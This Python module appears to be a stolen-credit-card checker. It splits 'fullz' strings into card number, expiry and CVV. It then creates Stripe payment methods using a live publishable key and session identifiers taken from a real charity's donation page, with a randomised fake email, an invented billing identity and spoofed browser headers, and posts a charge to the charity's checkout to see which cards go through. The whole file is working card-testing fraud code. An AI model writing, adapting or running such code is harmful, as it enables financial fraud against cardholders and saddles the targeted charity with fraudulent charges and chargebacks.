import asyncio
import random
from fake_useragent import UserAgent
import requests
from FUNC.defs import *
import re
from bs4 import BeautifulSoup





session = requests.session()
        
def gets(s, start, end):
            try:
                start_index = s.index(start) + len(start)
                end_index = s.index(end, start_index)
                return s[start_index:end_index]
            except ValueError:
                return None



async def create_cvv_charge(fullz , session):
    try:
        cc , mes , ano , cvv = fullz.split("|")


        r =requests.Session()
        email="craish"+str(random.randint(548,98698))+"niki@gmail.com"

        headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
}
    
        data = {
    'type':'card',
  'billing_details[address][city]':'Dighton',
  'billing_details[address][country]':'US',
  'billing_details[address][line1]':'Williams Street',
  'billing_details[address][line2]':'Bristol County', 
  'billing_details[address][postal_code]':'02764',    
  'billing_details[address][state]':'MA',
  'billing_details[email]':email,   
  'billing_details[name]':'Mr Johhanes Adams',        
  'card[number]':f'{cc}',
  'card[cvc]':f'{cvv}',
  'card[exp_month]':f'{mes}',
  'card[exp_year]':f'{ano}',
  'guid':'b68757cd-62bf-45a7-804e-e843a5a40fa947d237',
  'muid':'6bf2a8a4-2430-4395-a2ea-df427f5695f227112b',
  'sid':'784a0881-f9d2-4410-8a77-f9ceb701427c22cb0a', 
  'pasted_fields':'number',
  'payment_user_agent':'stripe.js/796a7b92df; stripe-js-v3/796a7b92df; split-card-element',
  'referrer':'https://renewable-world.enthuse.com',
  'time_on_page':'128928',
  'key':'pk_live_ftYOjqGtfMkXICnngj1VQh99',
}
            


        response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        print(response.text)

        id= response.json()['id']
        await asyncio.sleep(3)

        headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://renewable-world.enthuse.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://renewable-world.enthuse.com/cp/48d59/RWGOWA24?&key=17b4469b-0d5a-4576-905f-44949f132ce7',
    'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
}
    
        json_data = {
    'key': '17b4469b-0d5a-4576-905f-44949f132ce7',
    'paymentMethodId': id,
    'threeDSecureSupported': True,
    'stripeConnectedAccountId': 'acct_1JMrw02m8T0aiZrz',
    'cardCountryCode': 'US',
}

        response = r.post(
    'https://renewable-world.enthuse.com/checkoutstate/pay/stripe',
    headers=headers,
    json=json_data,
)
        print(response.text)
        await asyncio.sleep(2)
        return response

    except Exception as e:
        return str(e)
    
    # print(response.json()['message'])
    
